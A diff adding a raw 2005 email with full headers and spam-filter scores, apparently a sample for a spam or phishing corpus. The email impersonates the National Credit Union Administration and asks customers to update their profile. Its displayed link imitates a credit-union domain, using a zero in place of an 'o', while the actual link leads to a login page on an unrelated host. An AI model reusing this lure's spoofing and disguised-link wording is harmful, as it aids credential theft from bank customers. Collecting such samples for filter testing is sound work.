@@ -1,0 +1,97 @@
+From nobody Sun Jan 25 13:48:11 2015
+Return-Path: <nobody@tomlauren.com>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail2.example.com (mail2.example.com [10.3.4.5])
+ by naughty.example.com (Postfix) with ESMTP id 56979536E4D
+ for <nobody@login.example.com>; Thu, 24 Nov 2005 20:39:24 -0500 (EST)
+Received: from mail2.example.com (localhost.example.com [127.0.0.1])
+ by mail2.example.com (Postfix) with ESMTP id EA5266FA39D
+ for <nobody@example.com>; Thu, 24 Nov 2005 20:39:20 -0500 (EST)
+Received: from tomlauren.com (c-67-166-21-159.hsd1.co.comcast.net
+ [67.166.21.159]) by mail2.example.com (Postfix) with ESMTP
+ for <nobody@example.com>; Thu, 24 Nov 2005 20:39:20 -0500 (EST)
+Received: from tomlauren.com (tomlauren.com [127.0.0.1])
+ by tomlauren.com (8.13.1/8.13.1) with ESMTP id jAP1dqsc025044
+ for <nobody@example.com>; Thu, 24 Nov 2005 18:39:53 -0700
+Received: (from nobody@localhost)
+ by tomlauren.com (8.13.1/8.13.1/Submit) id jAP1dqvh025043;
+ Thu, 24 Nov 2005 18:39:52 -0700
+Date: Thu, 24 Nov 2005 18:39:52 -0700
+Message-Id: <200511250139.jAP1dqvh025043@tomlauren.com>
+To: nobody@example.com
+From: National Credit Union Administration <service@ncua.gov>
+Subject: Consumer Notice
+Reply-To: National Credit Union Administration <service@ncua.gov>
+Content-type: text/html
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: ***
+X-Spam-Status: No, score=4.0 required=5.0 tests=HTML_40_50,HTML_MESSAGE,
+ MIME_HEADER_CTYPE_ONLY,MIME_HTML_ONLY,RAZOR2_CF_RANGE_51_100,
+ RAZOR2_CHECK,RCVD_IN_NJABL_DUL,RCVD_IN_SORBS_DUL autolearn=no 
+ version=3.0.2
+X-Spam-Report: *  0.0 HTML_40_50 BODY: Message is 40% to 50% HTML
+ *  0.0 HTML_MESSAGE BODY: HTML included in message
+ *  0.1 RAZOR2_CF_RANGE_51_100 BODY: Razor2 gives confidence level above 50%
+ *      [cf: 100]
+ *  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+ *  1.5 RAZOR2_CHECK Listed in Razor2 (http://razor.sf.net/)
+ *  2.0 RCVD_IN_SORBS_DUL RBL: SORBS: sent directly from dynamic IP address
+ *      [67.166.21.159 listed in dnsbl.sorbs.net]
+ *  0.1 RCVD_IN_NJABL_DUL RBL: NJABL: dialup sender did non-local SMTP
+ *      [67.166.21.159 listed in combined.njabl.org]
+ * 0.1 MIME_HEADER_CTYPE_ONLY 'Content-Type' found without required MIME
+ headers
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 34
+
+
+<html>
+<body>
+
+<p align="justify">
+&nbsp;</p>
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collap
+se" bordercolor="#111111" width="60%" id="AutoNumber1">
+  <tr>
+    <td width="100%">
+    <p>
+</a>
+    <img alt="NCUA Seal" src="http://www.ncua.gov/images/prop/blueseal98.gif" align="left" border="0" width="100" height="98"></p>
+    <p>In attention of all Credit Union customers,&nbsp;<br>
+      <br>
+      As the Internet and information technology enable us to expand our services, we are committed to maintaining the trust customers have placed in us for protecting the privacy and security of information we have about you. In order to protect your information against unauthorized access, identity theft and account fraud we earnestly ask you to update your profile.&nbsp;<br>
+      <br>
+      To get started, please click the link below:&nbsp;<br>
+      <br>
+      <a 
+href="http://ns1.powerbtoc.com/install-old/ncua/login.php">http://ncua.online-ibanking.c<font face="Verdana" size="1">0</font>m/data/</a><br>
+      <br>
+      If you received this notice and you are not the authorized account holder, please be aware that it is in violation of our policy to represent oneself as another Credit Union user. Such action may also be in violation of local, national, and/or international law. Credit Union National Association is committed to assist law enforcement with any inquiries related to attempts to misappropriate personal information with the intent to commit fraud or theft. Information will be provided at the request of law enforcement agencies to ensure that perpetrators are prosecuted to the fullest extent of the law.&nbsp;<br>
+      <br>
+      Thanks for your patience as we work together to protect your account.&nbsp;<br>
+      <br>
+      Regards,&nbsp;<br>
+      <br>
+      NCUA Customer Support Center.&nbsp;<br>
+      <br>
+      This site is directed at or made available to persons in the United States and Credit Union customers only. Persons outside the United States may visit Credit Unions on line. Products and services described, as well as associated fees, charges, interest rates, and balance requirements may differ among geographic locations. Not all products and services are offered at all locations.&nbsp;<br>
+      <br>
+      <b><font face="Verdana" size="2">Copyright © 2005 - National Credit Union Administration Inc.
+    </font></b></p>
+    <a name="top">
+    <p align="center">
+    <img src="http://www.uccu.com/images/footer.gif" border="0" width="366" height="26"></a><p align="left">
+    <b><font size="1" face="Verdana"><br>
+    </font></b>
+    <br>
+    <img border="0" src="http://www.esfweb.com/Cleveland%20State%20Bank/Loans_files/houselender.gif" align="right" width="49" height="50"><img border="0" src="http://www.esfweb.com/Cleveland%20State%20Bank/Loans_files/fdic.gif" align="left" width="67" height="44"></p>
+    </td>
+  </tr>
+</table>
+
+</body>
+
+</html>
